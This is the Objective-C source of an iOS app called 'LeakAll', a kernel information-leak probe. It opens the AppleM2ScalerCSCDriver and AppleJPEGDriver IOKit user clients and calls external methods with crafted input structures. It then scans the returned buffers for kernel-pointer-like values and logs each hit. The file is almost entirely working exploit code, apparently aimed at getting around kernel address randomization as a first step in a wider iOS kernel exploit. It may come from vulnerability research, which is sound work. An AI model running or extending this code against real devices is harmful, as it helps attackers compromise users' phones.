#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[leakall] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static io_connect_t op(const char*name,uint32_t type){io_service_t s=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching(name));if(!s)return 0;io_connect_t c=0;kern_return_t kr=IOServiceOpen(s,mach_task_self(),type,&c);IOObjectRelease(s);L(@"[open %s t%u] 0x%x conn=0x%x",name,type,kr,c);return kr?0:c;}
static void scan(const char*tag,const uint8_t*b,size_t n){for(size_t i=0;i+8<=n;i+=8){uint64_t q=rd64(b+i);if((q&0xfffffff000000000ULL)==0xfffffff000000000ULL||(q>=0xffffffe000000000ULL&&q<0xffffffff00000000ULL))L(@"[hit %s] +0x%zx = 0x%llx",tag,i,(unsigned long long)q);}}
static void scaler11(void){
 io_connect_t c=op("AppleM2ScalerCSCDriver",0); if(!c)return;
 uint8_t out[0x400]; memset(out,0xAA,sizeof(out)); size_t os=0x298;
 kern_return_t kr=IOConnectCallMethod(c,11,NULL,0,NULL,0,NULL,NULL,out,&os);
 L(@"[scaler11] -> 0x%x osz=0x%zx",kr,os);
 if(kr==0){ for(int i=0;i<0x298 && i<0x100;i+=8)L(@"[s11q] +0x%x=0x%llx",i,(unsigned long long)rd64(out+i)); scan("s11",out,0x298); }
 IOServiceClose(c);
}
static void jpeg(void){
 io_connect_t c=op("AppleJPEGDriver",0); if(!c)return;
 uint8_t in[0x1000]; memset(in,0,sizeof(in));
 *(uint32_t*)(in+0x00)=0;          // mode
 *(uint32_t*)(in+0x04)=0x100;      // inputSize
 *(uint32_t*)(in+0x08)=0x4000;     // internal buffer size
 *(uint32_t*)(in+0x0c)=0x1000;     // outputSize
 *(uint32_t*)(in+0x14)=16;         // width
 *(uint32_t*)(in+0x18)=16;         // height
 *(uint32_t*)(in+0x2c)=0;          // subsampling
 *(uint64_t*)(in+0x30)=0;          // in-pointer: zero => no external buffer => out+0x4c write
 *(uint64_t*)(in+0x38)=0;
 *(uint64_t*)(in+0x40)=0;
 *(uint32_t*)(in+0x7c)=0;          // newHeaderSize
 uint8_t out[0x1000]; memset(out,0xAA,sizeof(out)); size_t os=0x1000;
 kern_return_t kr=IOConnectCallMethod(c,5,NULL,0,in,0x1000,NULL,NULL,out,&os);
 L(@"[jpeg sel5] -> 0x%x osz=0x%zx out4c=0x%llx out14=0x%llx out10=0x%llx",kr,os,
   (unsigned long long)rd64(out+0x4c),(unsigned long long)rd64(out+0x14),(unsigned long long)rd64(out+0x10));
 scan("jpeg5",out,0x1000);
 uint8_t in2[0xda0]; memset(in2,0,sizeof(in2));
 *(uint32_t*)(in2+0x00)=0; *(uint32_t*)(in2+0x04)=0x100; *(uint32_t*)(in2+0x08)=0x4000;
 *(uint32_t*)(in2+0x0c)=0x1000; *(uint32_t*)(in2+0x14)=16; *(uint32_t*)(in2+0x18)=16;
 *(uint32_t*)(in2+0x2c)=0; *(uint64_t*)(in2+0x30)=0; *(uint64_t*)(in2+0x38)=0; *(uint64_t*)(in2+0x40)=0;
 *(uint32_t*)(in2+0x7c)=0;
 uint8_t out2[0xda0]; memset(out2,0xAA,sizeof(out2)); size_t os2=0xda0;
 kr=IOConnectCallMethod(c,7,NULL,0,in2,0xda0,NULL,NULL,out2,&os2);
 L(@"[jpeg sel7] -> 0x%x osz=0x%zx out4c=0x%llx out14=0x%llx out10=0x%llx",kr,os2,
   (unsigned long long)rd64(out2+0x4c),(unsigned long long)rd64(out2+0x14),(unsigned long long)rd64(out2+0x10));
 scan("jpeg7",out2,0xda0);
 IOServiceClose(c);
}
static void run(void){ L(@"[start]"); scaler11(); jpeg(); L(@"[done]"); }
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"LeakAll\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"leakall.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
